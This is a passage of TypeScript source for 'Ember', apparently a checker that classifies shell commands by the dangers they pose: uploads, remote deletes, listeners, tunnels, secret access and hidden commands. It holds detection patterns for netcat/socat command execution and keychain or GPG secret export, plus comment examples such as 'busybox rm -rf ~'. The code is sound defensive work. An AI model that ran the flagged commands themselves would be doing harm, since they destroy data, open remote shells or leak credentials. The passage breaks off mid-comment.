const SENDS_ONLY = /^(put|mput|reput|cd|lcd|ls|dir|pwd|lpwd|mkdir|lmkdir|rmdir|rm|mrm|del|chmod|rename|mv|open|user|bye|quit|exit|close|set|prompt|recurse|mask|binary|ascii|passive|hash|verbose)$/i;
/**
 * Whether a file-transfer client may fetch files, of names and into folders Ember can't tell (commands-remote-r8-3):
 * a session, a batch file, its input or an address may (every sftp: `host:file` fetches, and it takes no commands on
 * its line); commands it is given on its line (lftp's, smbclient's and tftp's `-c`) only when one of them isn't on
 * SENDS_ONLY (`get`, `mget`, `mirror`…; smbclient's `prompt`, `recurse` and `mask` only set how it sends). ncftpput
 * only sends and telnet moves no files. `smbclient -L` marks as a session does: a value written onto another option
 * can end in `L` too (`-WGLOBAL`, `-UPAUL`), so Ember can't tell a listing from a session (commands-remote-y8-2).
 */
function clientMayFetch(h: H): boolean {
  if (h.key === "ncftpput" || h.key === "telnet") return false;
  if (h.s.stdin !== null) return true;
  const k = h.args.findIndex(a => (h.key === "lftp" || h.key === "smbclient" || h.key === "tftp") && /^-c/.test(a.v ?? ""));
  if (k < 0) return true;
  const rest = h.args.slice(k + 1);
  const text = h.key === "tftp" ? (rest.some(a => a.v === null) ? null : rest.map(a => a.v).join(" ")) : h.args[k].v === "-c" ? h.args[k + 1]?.v : h.args[k].v?.slice(2);
  if (text === null || text === undefined || /[`$]/.test(text)) return true;
  return text.split(/[;\n]|&&|\|\|/).some(c => { const w = c.trim().split(/\s+/)[0] ?? ""; return w !== "" && !SENDS_ONLY.test(w); });
}
reg(NATIVE, ["rsync"], h => {
  const spec: OptSpec = {
    // --mkpath and every other switch take no value (commands-remote-r4-1).
    shortValue: "eBfTM@",
    longValue: ["rsh", "rsync-path", "exclude", "include", "filter", "files-from", "exclude-from", "include-from", "password-file", "log-file", "log-file-format", "backup-dir", "compare-dest", "copy-dest", "link-dest", "temp-dir", "partial-dir", "chmod", "chown", "usermap", "groupmap", "timeout", "contimeout", "port", "address", "sockopts", "bwlimit", "max-size", "min-size", "max-delete", "modify-window", "suffix", "out-format", "info", "debug", "checksum-choice", "compress-choice", "skip-compress", "outbuf", "stop-after", "stop-at", "write-batch", "read-batch", "only-write-batch", "iconv", "remote-option", "block-size", "protocol", "early-input", "max-alloc", "compress-level", "zl", "copy-as", "checksum-seed", "cc", "zc", "log-format", "config", "dparam"],
  };
  // Main's table gave --mkpath the next word and knew no -@, --cc, --zl, --config and the like, so the word after one of
  // them was a file to copy: judged that way too (commands-held-8).
  const was: OptSpec = { shortValue: "eBfTM", longValue: ["rsh", "rsync-path", "exclude", "include", "filter", "files-from", "exclude-from", "include-from", "password-file", "log-file", "log-file-format", "backup-dir", "compare-dest", "copy-dest", "link-dest", "temp-dir", "partial-dir", "chmod", "chown", "usermap", "groupmap", "timeout", "contimeout", "port", "address", "sockopts", "bwlimit", "max-size", "min-size", "max-delete", "modify-window", "suffix", "out-format", "info", "debug", "checksum-choice", "compress-choice", "skip-compress", "outbuf", "stop-after", "stop-at", "write-batch", "read-batch", "only-write-batch", "iconv", "remote-option", "block-size", "protocol", "early-input", "mkpath"] };
  const p = heldOpts(h, spec, was);
  for (const e of values(p, "e", "rsh")) if (e === null || !/^ssh(\s+-[A-Za-z]+(\s+[A-Za-z0-9._/~-]+)?)*$/.test(e)) h.e.unclear("unclear.rsync-rsh", "It runs a remote shell command Ember can't see.");
  if (values(p, "rsync-path", "remote-option", "M").length) h.e.unclear("unclear.rsync-rsh", "It runs a command on the other computer Ember can't see.");
  for (const f of values(p, "password-file", "files-from", "exclude-from", "include-from", "read-batch")) if (f) h.e.usePath(lit(f), "read", h.sc);
  for (const f of values(p, "log-file", "write-batch", "only-write-batch")) if (f) h.e.usePath(lit(f), "write", h.sc);
  const ops = p.operands;
  const remote = (a: Arg): boolean => a.v !== null && (/^rsync:\/\//i.test(a.v) || (SCP_LIKE.test(a.v) && !/^[A-Za-z]:[\\/]/.test(a.v)) || /::/.test(a.v));
  // One operand lists what is there, as ls does (commands-remote-i5a).
  if (ops.length === 1 && !remote(ops[0]) && !h.e.readsAsMain) h.e.usePath(ops[0], "list", h.sc);
  if (ops.length < 2) return;
  const dest = ops[ops.length - 1];
  const sources = ops.slice(0, -1);
  const deletes = has(p, "delete", "delete-before", "delete-during", "delete-delay", "delete-after", "delete-excluded", "del");
  const removeSrc = has(p, "remove-source-files");
  if (dest.v === null) { h.e.unclear("unclear.unresolved-arg", "Ember can't tell where rsync copies to."); return; }
  if (remote(dest)) {
    const host = hostOf(dest.v);
    const files = sources.filter(s => !remote(s));
    const objs = objsOf(h, files, removeSrc ? "move" : "readTree");
    h.e.add("publish", "upload.rsync", `Sends data to ${host}.`, { objects: [{ kind: "host", text: host, abs: null }, ...objs], program: "rsync" });
    if (deletes) h.e.add("remote-delete", "rsync.delete-remote", `Deletes files in ${dest.v} that aren't in ${listOf(objs)}.`);
    if (removeSrc) h.e.add("destroy", "posix.rsync", `Deletes ${listOf(objs)} after copying.`, { objects: objs });
    return;
  }
  const destObj = h.e.usePath(dest, deletes ? "deleteTree" : "write", h.sc);
  // -R and --files-from (which implies it) put each file at its path under the folder (`rsync -R a/b/x dest/` makes
  // dest/a/b/x), and `/./` marks where that path starts: never at dest/<name>, so no file of its name is probed and
  // the whole folder may be written, as cp --parents (commands-remote-v4-1).
  const relative = has(p, "R", "relative") || values(p, "files-from").length > 0 || sources.some(s => /(^|[\\/])\.[\\/]/.test(s.v ?? ""));
  // From another computer, or from a download of this task: what lands is a download (commands-remote-c2-2). A file
  // lands as the file of its name in the folder (`rsync x.csv .`, `rsync x.csv data/`), or as the name given while the
  // target doesn't say it is a folder, as cp's copies do: never the whole folder (commands-remote-c3-3). Another
  // computer's files, or a folder's contents (`vendor/`), can be anything in it; and so can what -R puts there, of a
  // download or of a folder that holds one (commands-remote-v4-1).
  if (sources.some(remote) || sources.some(s => s.glob && h.e.isDownloaded(s, h.sc))) h.e.download(dest.v, h.sc);
  else if (relative) {
    if (sources.some(s => h.e.isDownloaded(s, h.sc) || h.e.holdsDownload(s, h.sc))) h.e.download(dest.v, h.sc);
  }
  else if (destObj.abs !== null) {
    const files = sources.filter(s => !remote(s) && !s.glob);
    const contents = files.filter(s => /[\\/]$/.test(s.v ?? "") && h.e.isDownloaded(s, h.sc));
    if (contents.length) h.e.download(dest.v, h.sc);
    const intoFolder = files.length > 1 || /[\\/]$/.test(dest.v) || /^\.\.?$/.test(dest.v);
    h.e.carryCopies(files.filter(s => !contents.includes(s)), { ...destObj, text: intoFolder && !/[\\/]$/.test(destObj.text) ? `${destObj.text}/` : destObj.text }, h.sc);
  }
  const srcObjs = objsOf(h, sources.filter(s => !remote(s)), removeSrc ? "move" : "readTree");
  if (deletes) h.e.add("destroy", "posix.rsync", `Deletes files in ${destObj.text} that aren't in ${listOf(srcObjs, "the source")}.`, { objects: [destObj] });
  if (removeSrc) h.e.add("destroy", "posix.rsync", `Deletes ${listOf(srcObjs)} after copying.`, { objects: srcObjs });
  if (!destObj.abs) return;
  if (relative) {
    h.e.judgeInside(destObj.abs, "write", h.sc, destObj.text);
    // Where each named source lands is judged too (`rsync -R ember/x ~/.config/` writes in Ember's own folder): its
    // path after `/./`, else as written without a leading `/` or `./`; one with `..` in it can't be placed.
    for (const s of sources) {
      if (remote(s) || s.v === null) continue;
      const dot = s.v.search(/[\\/]\.[\\/]/);
      const rel = (dot >= 0 ? s.v.slice(dot + 3) : s.v).replace(/^([\\/]|\.[\\/])+/, "");
      if (rel !== "" && !/(^|[\\/])\.\.([\\/]|$)/.test(rel)) h.e.usePath({ ...s, v: (h.sc.path.flavour === "win32" ? win32 : posix).join(destObj.abs, rel) }, "write", h.sc);
    }
    h.e.add("destroy", "posix.rsync", `Replaces files in ${destObj.text} if they exist.`, { objects: [destObj] });
    return;
  }
  // Files of their own names (not a folder's contents, a pattern or another computer's): what is replaced is the file of
  // each name in the folder, as cp says it (commands-remote-c3-3: never "Replaces the current folder if it exists.").
  const named = sources.filter(s => !remote(s) && s.v !== null && !s.glob && !/[\\/]$/.test(s.v));
  const intoFolder = sources.length > 1 || /[\\/]$/.test(dest.v) || /^\.\.?$/.test(dest.v);
  const inside = (s: Arg): Obj => {
    const p2 = (h.sc.path.flavour === "win32" ? win32 : posix).join(destObj.abs!, baseName(s.v ?? "", h.sc.path.flavour));
    h.e.usePath(lit(p2), "write", h.sc);
    return { kind: "path", text: p2, resolved: p2, abs: p2 };
  };
  if (named.length === sources.length && intoFolder) {
    for (const o of named.map(inside)) h.e.add("destroy", "posix.rsync", `Replaces ${o.abs} if it exists.`, { objects: [o], ifExists: o.abs! });
    return;
  }
  const o = named.length === 1 && sources.length === 1 ? inside(named[0]) : null;
  const inFolder = o ? { says: `Replaces ${o.abs} if it exists.`, objects: [o], ifExists: o.abs! } : undefined;
  h.e.add("destroy", "posix.rsync", `Replaces ${destObj.text} if it exists.`, { objects: [destObj], ifExists: destObj.abs, ...(inFolder ? { inFolder } : {}) });
});
reg(NATIVE, ["rclone"], h => {
  const verb = firstOperand(h.args).v ?? "";
  // rclone's value options (--transfers 4, --config …) sit among the operands, so SOURCE and DEST are read past them,
  // or `--transfers`'s `4` is mistaken for the destination (commands-remote-r8-2).
  const rcloneP = parseOpts(h.args.slice(firstOperand(h.args).at + 1), {
    longValue: ["transfers", "checkers", "config", "bwlimit", "include", "exclude", "filter", "filter-from", "include-from", "exclude-from", "files-from", "max-age", "min-age", "max-size", "min-size", "contimeout", "timeout", "retries", "low-level-retries", "multi-thread-streams", "multi-thread-cutoff", "log-file", "log-level", "stats", "buffer-size", "order-by", "backup-dir", "suffix", "compare-dest", "copy-dest", "track-renames-strategy", "max-depth", "cache-dir", "temp-dir", "user-agent"],
  });
  const ops = rcloneP.operands.map(a => a.v ?? "");
  const remote = (s: string): boolean => /^[A-Za-z0-9_.-]+:/.test(s) && !/^[A-Za-z]:[\\/]/.test(s);
  // What asks is also read as main read it, every word that isn't an option in a row, so a remote in a value option
  // (`--backup-dir remote:b`, `--compare-dest remote:r`) asks as it did there; the parsed operands only place the marks.
  // A remote attached to an option (`--backup-dir=remote:b`) is data sent there as well (commands-remote-x8-1).
  const mainOps = h.args.filter(a => !isOption(a)).slice(1).map(a => a.v ?? "");
  const optRemote = rcloneP.opts.map(o => o.value ?? "").find(remote);
  const remoteAt = ops.some(remote) || mainOps.some(remote);
  if (/^(config|password|obscure|authorize)$/.test(verb)) { h.e.add("secret", "secret.program", SAYS.secrets); return; }
  if (/^(delete|purge|deletefile|rmdir|rmdirs|cleanup|dedupe)$/.test(verb)) { h.e.add(remoteAt ? "remote-delete" : "destroy", remoteAt ? "cloud.delete" : "posix.rm", "Deletes files."); return; }
  if (/^(copy|copyto|sync|move|moveto|copyurl|bisync|rcat|mkdir|touch|settier|link)$/.test(verb)) {
    // More operands than the verb takes: an option this table doesn't know took a value (`--max-transfer 10G`), so which
    // word is the destination is a guess, and it asks (commands-remote-y8-5).
    if (/^(copy|copyto|sync|move|moveto|copyurl|bisync)$/.test(verb) && ops.length > 2) h.e.unclear("unclear.rclone-operands", "Ember can't tell where it copies files to.");
    const dest = ops[ops.length - 1] ?? "";
    const sentTo = [dest, mainOps[mainOps.length - 1] ?? "", optRemote ?? ""].find(remote);
    if (sentTo !== undefined) {
      h.e.add("publish", "upload.rclone", `Sends data to ${sentTo.split(":")[0]}.`);
      if (verb === "sync" || verb === "bisync") h.e.add("remote-delete", "rsync.delete-remote", "Deletes files on the other side that aren't here.");
    }
    // Main took the last word that isn't an option for the destination, so with a value option behind a remote one
    // (`rclone sync . remote:x --backup-dir x`) a sync deleted files here: that danger stays on the card, for no intent
    // row to cover (commands-held-9).
    if (remote(dest) && verb === "sync" && !remote(mainOps[mainOps.length - 1] ?? "")) h.e.add("destroy", "posix.rsync", "Deletes files here that aren't on the other side.", { widening: ["fed"] });
    if (!remote(dest)) {
      if (verb === "sync") h.e.add("destroy", "posix.rsync", "Deletes files here that aren't on the other side.");
      // Files copied here from a remote (`rclone copy remote:x .`, `copyurl URL file`) are downloads: running one later
      // asks (commands-remote-r8-2). Into a folder (copy, sync, bisync), of unknown name; copyto/moveto name the file.
      if (/^(copy|copyto|sync|move|moveto|copyurl|bisync|rcat)$/.test(verb) && (verb === "copyurl" || ops.slice(0, -1).some(remote))) {
        if (/^(copyto|moveto|rcat)$/.test(verb) && dest) h.e.download(dest, h.sc);
        else if (verb === "copyurl") { const f = ops[ops.length - 1]; if (f && !remote(f)) h.e.download(f, h.sc); else h.e.markUnnamed(".", h.sc); }
        else h.e.markUnnamed(dest || ".", h.sc);
      }
    }
    if ((verb === "move" || verb === "moveto") && (ops.slice(0, -1).some(remote) || mainOps.slice(0, -1).some(remote))) h.e.add("remote-delete", "cloud.delete", "Deletes the files it moves from the other side.");
    return;
  }
  if (/^(mount|serve|rcd|nfsmount)$/.test(verb)) { h.e.add("system", "system.kernel", "Changes how the system works."); return; }
  if (!/^(ls|lsd|lsl|lsf|lsjson|cat|size|about|check|cryptcheck|tree|version|listremotes|md5sum|sha1sum|hashsum|ncdu|help|backend|selfupdate|test|config|genautocomplete|completion|gendocs)$/.test(verb)) h.e.unclear("unclear.rclone-verb", "Ember can't tell which rclone command this runs.");
});
// Servers, tunnels and shares (review #178).
/** A loopback address: only programs on this computer can connect to it. */
const LOOPBACK = /^(localhost|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|::1|0*:(0*:)*0*1|ip6-localhost|ip6-loopback)$/i;
/** The address of `host:port`, `[v6]:port` or `:port` ("" for every address; a bare port too). */
function listenHost(addr: string): string {
  const v6 = /^\[([^\]]*)\](:\d*)?$/.exec(addr);
  if (v6) return v6[1];
  if (/^:?\d*$/.test(addr)) return "";
  const at = addr.lastIndexOf(":");
  return at < 0 || addr.indexOf(":") !== at ? addr : addr.slice(0, at);
}
/**
 * A server Ember starts: unless it listens only on loopback (`bind`: "" for every address, null when Ember can't
 * tell), other computers can connect; whoever connects reads the folder it serves, so that is read as a whole and asks
 * when it is outside the task's folder.
 */
function listens(h: H, bind: string | null, root: Arg | null): void {
  if (bind === null || !LOOPBACK.test(bind.replace(/^\[|\]$/g, ""))) h.e.add("publish", "net.listen", "Lets other computers on your network connect to this one.");
  if (!root) return;
  const obj = h.e.usePath(root, "readTree", h.sc);
  if (obj.abs === null || !inWorkTree(obj.abs, h.sc.path)) {
    h.e.add("publish", "net.serve", `Shares ${root.v === null ? "a folder Ember can't name" : obj.text} with anyone who connects.`, { objects: [obj] });
  }
}
/** The folder a server is given (this one when none is; one Ember can't see stays unresolved). */
const servedRoot = (v: string | null | undefined): Arg => (v === undefined ? lit(".") : v === null ? { v: null, raw: "?", glob: false } : lit(v));
const TUNNEL_SAYS = "Makes a service on this computer reachable from the internet.";
reg(NATIVE, ["busybox", "toybox"], h => {
  // An applet is that program, judged by its own row or the closed default (`busybox rm -rf ~`, `busybox telnetd`:
  // commands-closed-x9-6); with no applet (`busybox --list`) it only says what it holds.
  const first = h.args[0];
  // toybox had no row at main: it keeps an unknown program's reading there (a broad folder, and `-o` by
  // UNKNOWN_OPTIONS at the dispatch), with the applet judged on top (commands-closed-y9-1).
  const noRow = h.key === "toybox";
  if (first && first.v === null) { if (noRow) generic(h, true); h.e.unclear("unclear.hidden-command", `Ember can't tell what ${h.prog} runs.`); return; }
  if (!first || first.v === null || first.v.startsWith("-")) { generic(h, noRow); return; }
  if (noRow || lower(first) !== "httpd") {
    // Main's reading stays (generic(): one that runs others, `busybox sh -c …`, asks how), and an applet that isn't
    // one of those is judged as itself as well.
    generic(h, noRow);
    if (!runners().has(first.v.toLowerCase())) h.e.payload(h.args, h.sc, h.key);
    return;
  }
  // busybox httpd [-f] [-p [IP:]PORT] [-h HOME] [-c CONF]: port 80 on every address, this folder; without -f it
  // carries on in the background.
  const q = parseOpts(h.args.slice(1), { shortValue: "pchurmedP" });
  const port = values(q, "p").pop();
  listens(h, port === undefined ? "" : port === null ? null : listenHost(port), servedRoot(values(q, "h").pop()));
  for (const c of values(q, "c")) if (c) h.e.usePath(lit(c), "read", h.sc);
  if (!h.args.some(a => a.v !== null && /^-[a-zA-Z]*f/.test(a.v))) h.e.add("escape", "escape.background", SAYS.keepsRunning);
});
reg(NATIVE, ["caddy"], h => {
  const verb = firstOperand(h.args).v;
  const q = parseOpts(h.args, {
    shortValue: "rlcatdf",
    longValue: ["root", "listen", "domain", "from", "to", "config", "adapter", "envfile", "pidfile", "address", "body", "header", "status"],
  });
  for (const f of values(q, "c", "config", "envfile")) if (f) h.e.usePath(lit(f), "read", h.sc);
  if (verb === "trust" || verb === "untrust") { h.e.add("system", "system.security", TRUST_SAYS); return; }
  if (verb === "environ") { h.e.add("secret", "secret.env", SAYS.env); return; }
  if (verb === "file-server" || verb === "reverse-proxy" || verb === "respond") {
    // Where it listens: every address when --listen isn't given. reverse-proxy always listens on every address, on
    // --from's port; --from's host only picks which requests it answers (review #178).
    const at = verb === "reverse-proxy" ? undefined : values(q, "l", "listen").pop();
    listens(h, at === undefined ? "" : at === null ? null : listenHost(at.replace(/^[a-z]+:\/\//i, "")), verb === "file-server" ? servedRoot(values(q, "r", "root").pop()) : null);
    return;
  }
  if (verb === "run" || verb === "start" || verb === "reload") {
    // Its settings say where it listens and what it serves; Ember doesn't read them.
    h.e.add("publish", "net.listen", "Lets other computers on your network connect to this one.");
    if (verb === "start") h.e.add("escape", "escape.background", SAYS.keepsRunning);
    return;
  }
  h.e.readArgs(q.operands.slice(1), h.sc);
});
reg(NATIVE, ["miniserve"], h => {
  // miniserve [PATH]: every address unless -i/--interfaces says otherwise; -u lets whoever connects add files.
  // Main's table gave -q and --qrcode the next word, so the folder served was the word after it: judged that way too
  // (commands-held-8).
  const q = heldOpts(h, {
    // -q (--qrcode) takes no value (commands-remote-i5a).
    shortValue: "ipacdt",
    longValue: ["interfaces", "port", "auth", "auth-file", "color-scheme", "color-scheme-dark", "title", "header", "index", "route-prefix", "tls-cert", "tls-key"],
  }, { shortValue: "ipacdtq", longValue: ["interfaces", "port", "auth", "auth-file", "color-scheme", "color-scheme-dark", "title", "header", "index", "route-prefix", "tls-cert", "tls-key", "qrcode"] });
  const ifs = values(q, "i", "interfaces");
  const root = q.operands[0] ?? lit(".");
  listens(h, ifs.length === 0 ? "" : ifs.find(i => i === null || !LOOPBACK.test(i.replace(/^\[|\]$/g, ""))) ?? "localhost", root);
  if (has(q, "u", "upload-files")) h.e.usePath(root, "write", h.sc);
  for (const f of values(q, "auth-file", "tls-key")) if (f) h.e.usePath(lit(f), "read", h.sc);
});
reg(NATIVE, ["cloudflared", "ngrok"], h => {
  const words = h.args.map(a => a.v);
  if (words.some(w => w !== null && /^(-v|-h|--version|--help|version|help|completion|update)$/.test(w))) return;
  if (words.includes("service")) { h.e.add("system", "service.change", "Starts, stops or changes a system service."); return; }
  if (h.key === "ngrok") {
    if (words.some(w => w !== null && /^(http|tcp|tls|start|tunnel)$/.test(w))) h.e.add("publish", "net.tunnel", TUNNEL_SAYS);
    else h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
    return;
  }
  // cloudflared: `tunnel` (a quick one with --url, or a named one), `--url` alone, and the bare program with its
  // settings all run a tunnel; `tunnel list|info` only print, `access` reaches other services from here.
  const t = words.indexOf("tunnel");
  const sub = t < 0 ? undefined : words.slice(t + 1).find(w => w === null || /^(run|list|info|create|delete|route|cleanup|login|token|vnet)$/.test(w));
  if (t < 0 && words.includes("access")) { if (words.includes("token")) h.e.add("secret", "secret.program", SAYS.secrets); return; }
  if (sub === "list" || sub === "info") return;
  if (sub === "token") { h.e.add("secret", "secret.program", SAYS.secrets); return; }
  if (sub === "delete" || sub === "cleanup") { h.e.add("remote-delete", "cloud.delete", "Deletes things in Cloudflare."); return; }
  if (sub === "create" || sub === "route" || sub === "login" || sub === "vnet") { h.e.add("publish", "cloud.change", "Changes Cloudflare."); return; }
  h.e.add("publish", "net.tunnel", TUNNEL_SAYS);
});
reg(NATIVE, ["tailscale"], h => {
  const words = h.args.map(a => a.v);
  const sub = words.find(w => w === null || !w.startsWith("-"));
  if (sub === undefined || (sub !== null && /^(status|ip|ping|netcheck|whois|version|help|completion|licenses)$/.test(sub))) return;
  // `funnel` opens this computer to the internet, `serve` to the tailnet; each only prints with `status`.
  if (sub === "funnel" || sub === "serve") { if (!words.includes("status")) h.e.add("publish", "net.tunnel", TUNNEL_SAYS); return; }
  if (sub === "file" && words.includes("cp")) { h.e.add("publish", "net.send", "Sends files to another computer."); return; }
  // Everything else (up, down, set, login, logout, ssh, a word it doesn't know) changes or leaves this computer's network.
  h.e.add("system", "net.tailscale", "Changes this computer's Tailscale connection.");
});
reg(NATIVE, ["ssh-copy-id"], h => {
  const p = opts(h, { shortValue: "ioptFJ", longValue: [] });
  sshOptions(h, p);
  const host = hostOf((p.operands[p.operands.length - 1]?.v ?? "another computer").replace(/^[^@]*@/, ""));
  h.e.add("publish", "send.ssh-key", `Adds your key to ${host}, so this computer can sign in there without a password.`, { objects: [{ kind: "host", text: host, abs: null }] });
});
reg(NATIVE, ["mount_smbfs", "mount_afp", "mount_webdav"], h => {
  // macOS: mounting another computer's share signs in there (with the password in the keychain, if any).
  const ops = h.args.filter(a => !isOption(a) && h.args[h.args.indexOf(a) - 1]?.v !== "-o");
  const share = ops[0]?.v ?? null;
  const host = share === null ? "another computer" : /^(?:[a-z]+:)?\/\/(?:[^@/]*@)?([^/:]+)/i.exec(share)?.[1] ?? share;
  h.e.add("publish", "net.mount", `Connects to ${host} and signs in there with your account.`, { objects: [{ kind: "host", text: host, abs: null }] });
  if (ops[1]) h.e.usePath(ops[1], "write", h.sc);
});
reg(NATIVE, ["nc", "ncat", "netcat", "socat", "s_client"], h => {
  const args = h.args.map(a => a.v ?? "");
  if (h.key === "socat" && args.some(a => /^(EXEC|SYSTEM):/i.test(a))) h.e.unclear("unclear.socat-exec", "It runs a program Ember can't see.");
  if (args.some(a => /^-[a-zA-Z]*[ec]$/.test(a) || a === "--exec" || a === "--sh-exec" || a === "--lua-exec")) h.e.unclear("unclear.nc-exec", "It runs a program Ember can't see.");
  if (args.some(a => /^-[a-zA-Z]*l/.test(a) || a === "--listen" || /^(TCP|UDP)[46]?-LISTEN:/i.test(a))) { h.e.unclear("unclear.listener", "It listens for connections from other computers."); return; }
  const host = h.args.filter(a => !isOption(a))[0]?.v ?? "another computer";
  h.e.add("publish", "send.nc", `Sends data to ${host}.`, { objects: [{ kind: "host", text: host, abs: null }] });
});
reg(NATIVE, ["mail", "mailx", "sendmail", "msmtp", "swaks", "mutt", "neomutt", "s-nail", "ssmtp", "blat"], h => {
  if ((h.key === "mutt" || h.key === "neomutt") && h.s.stdin === null && !h.args.some(a => a.v === "-s")) { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  h.e.add("publish", "send.mail", "Sends an email.");
  for (const a of h.args) if (h.args[h.args.indexOf(a) - 1]?.v === "-a" || h.args[h.args.indexOf(a) - 1]?.v === "-A") h.e.usePath(a, "read", h.sc);
});
reg(NATIVE, ["s3cmd", "azcopy", "gdrive", "dropbox_uploader", "megaput", "transfer"], h => {
  const verb = firstOperand(h.args).v ?? "";
  if (/^(del|rm|rb|delete|remove)$/.test(verb)) h.e.add("remote-delete", "cloud.delete", "Deletes files on a remote service.");
  else if (/^(ls|la|du|info|get|list|cat)$/.test(verb)) return;
  else h.e.add("publish", "upload.cloud", "Sends data to a remote service.");
});

// ------------------------------------------------------------------------------------------------------------------
// Secrets (§3.5.4).

reg(NATIVE, ["security"], h => {
  const verb = h.args[0]?.v ?? "";
  if (/^(find-generic-password|find-internet-password|dump-keychain|export|unlock-keychain|add-generic-password|add-internet-password|delete-generic-password|delete-internet-password|find-certificate|import|set-keychain-password|create-keychain|delete-keychain|set-generic-password-partition-list|authorizationdb|export-identities|find-identity)$/.test(verb)) {
    h.e.add("secret", "secret.program", SAYS.secrets);
  }
  if (/^(add-trusted-cert|remove-trusted-cert|add-certificates|delete-certificate|trust-settings-import)$/.test(verb)) h.e.add("system", "system.security", TRUST_SAYS);
});
reg(NATIVE, ["keyctl"], h => { if (/^(print|read|pipe|show|add|padd|request|update|newring|unlink|clear|purge|invalidate)$/.test(h.args[0]?.v ?? "")) h.e.add("secret", "secret.program", SAYS.secrets); });
reg(NATIVE, ["ssh-keygen"], h => {
  // Main's table knew no -P, so the -f after it still named the key file: judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "aCEfFIJjKmMnNOPrstVwYzZbD", longValue: [] }, { shortValue: "aCEfFIJjKmMnNOrstVwYzZbD", longValue: [] });
  for (const f of values(p, "f")) if (f) h.e.usePath(lit(f), has(p, "l", "F", "B") ? "read" : "write", h.sc);
  if (has(p, "l", "F", "B", "H") || (has(p, "R") && false)) return;
  h.e.add("secret", "secret.program", SAYS.secrets);
});
reg(NATIVE, ["gpg", "gpg2", "gpgsm"], h => {
  const flags = h.args.map(a => a.v ?? "");
  if (flags.some(f => /^--(export-secret-keys|export-secret-subkeys|decrypt|gen-key|full-generate-key|full-gen-key|quick-gen-key|quick-generate-key|delete-secret-keys|delete-secret-and-public-key|edit-key|sign|clearsign|clear-sign|detach-sign|change-passphrase|passwd|import|card-edit|export-ssh-key|symmetric)$/.test(f) || /^-[a-zA-Z]*[dsc]$/.test(f) && !f.startsWith("--"))) {
    h.e.add("secret", "secret.program", SAYS.secrets);
  }
  if (flags.some(f => f === "--edit-key" || f === "--card-edit")) h.e.unclear("unclear.interactive", SAYS.interactive);
  h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
});
reg(NATIVE, ["openssl"], h => {
  const sub = h.args[0]?.v ?? "";
  if (sub === "s_client" && h.s.stdin !== null && h.s.stdin !== "heredoc") {
    // Whatever stdin holds goes to the server: a file, or another program's output (text the command shows, from
    // echo or printf, doesn't hide anything) (review #178).
    const from = h.s.pipedFrom !== undefined ? h.e.commands[h.s.pipedFrom]?.program.toLowerCase() : undefined;
    const files = h.s.redirs.filter(r => r.kind === "read").map(r => r.target?.v ?? null);
    const sends = h.s.stdin === "file" ? files.some(f => f === null || !NULL_SINKS.has(f.toLowerCase())) : !/^(echo|printf|true|:|write-output)$/.test(from ?? "");
    const at = h.args.findIndex(a => a.v === "-connect");
    const host = hostOf(at >= 0 ? h.args[at + 1]?.v ?? "another computer" : "another computer");
    if (sends) h.e.add("publish", "send.nc", `Sends data to ${host}.`, { objects: [{ kind: "host", text: host, abs: null }] });
  }
  if (sub === "s_server") {
    // A TLS server on every address unless -accept names one; -WWW and -HTTP serve this folder's files.
    const at = h.args.findIndex(a => a.v === "-accept");
    const addr = at >= 0 ? h.args[at + 1]?.v ?? null : "";
    listens(h, addr === null ? null : listenHost(addr), h.args.some(a => a.v === "-WWW" || a.v === "-HTTP") ? lit(".") : null);
  }
  if (/^(pkcs12|pkcs8|rsa|ec|genrsa|genpkey|req|ca)$/.test(sub) && h.args.some(a => /^-(passin|passout|export|nodes|noenc|text)$/.test(a.v ?? ""))) h.e.add("secret", "secret.program", SAYS.secrets);
  if (h.args.some(a => /^-pass(in|out)$/.test(a.v ?? "")) && h.args.some(a => /^pass:/.test(a.v ?? ""))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  if (h.args.some(a => /^-(engine|provider|provider-path|keygen_engine)$/.test(a.v ?? ""))) h.e.unclear("unclear.openssl-engine", "It loads a program library Ember can't see.");
  for (const k of h.args.keys()) { const v = h.args[k].v; if (v && /^-(in|out|key|inkey|signkey|certfile|CAfile)$/.test(v)) { const f = h.args[k + 1]; if (f) { if (v === "-out") overwrites(h, f); else h.e.usePath(f, "read", h.sc); } } }
});

/** A file a program writes in place of what was there (`sort -o`, `uniq in out`, `xxd in out`): an overwrite (§3.4.6). */
function overwrites(h: H, f: Arg, rule = "redirect.overwrite"): void {
  if (f.v !== null && (NULL_SINKS.has(f.v.toLowerCase()) || f.v === "-")) return;
  const obj = h.e.usePath(f, "write", h.sc);
  if (obj.abs === null) { h.e.add("destroy", rule, "Writes to a file Ember can't name."); return; }
  h.e.add("destroy", rule, `Overwrites ${obj.text} if it exists.`, obj.kind === "glob" ? { objects: [obj] } : { objects: [obj], ifExists: obj.abs });
}

// Text tools that also write a file: sort -o, uniq's second operand, xxd's second operand, iconv -o, patch's file.
reg(NATIVE, ["sort", "gsort"], h => {
  const p = opts(h, { shortValue: "ktoSTy", longValue: ["key", "field-separator", "output", "buffer-size", "temporary-directory", "parallel", "files0-from", "batch-size", "compress-program", "random-source", "sort"] });
  if (values(p, "compress-program").length || h.args.some(a => /^--compress-prog/.test(a.v ?? ""))) h.e.unclear("unclear.sort-program", "It runs a program Ember can't see.");
  for (const o of values(p, "o", "output")) overwrites(h, o === null ? { v: null, raw: "?", glob: false } : lit(o));
  for (const f of values(p, "files0-from")) if (f) h.e.usePath(lit(f), "read", h.sc);
  h.e.readArgs(p.operands, h.sc, { unresolvedUnclear: true });
  // What it writes out from a download is the download (`sort x.sh -o y.sh`: commands-remote-c2-2).
  if (p.operands.some(o => h.e.isDownloaded(o, h.sc)) || h.e.pipe.carried === true) for (const o of values(p, "o", "output")) if (o) h.e.carryDownload(o, h.sc);
});
// dos2unix and its kin convert in place, or with -n into the new file after each input (`dos2unix -n x.sh y.sh`, the
// usual fix for a downloaded script's line endings): that file is the download too (commands-remote-c2-2).
reg(NATIVE, ["dos2unix", "unix2dos", "mac2unix", "unix2mac"], h => {
  // This row is newer than 4d64d3a, where dos2unix and unix2dos were ordinary programs whose every word was read as a
  // file, the one after -c or -D too, and mac2unix and unix2mac programs Ember didn't know, whose word that names a
  // program may be a command they run: judged that way first, with this row's own findings on top, so none decides
  // less safely than it did (`dos2unix -c <Ember's file>` is refused, `unix2mac -f rm -rf ~` too: commands-held-x9-5).
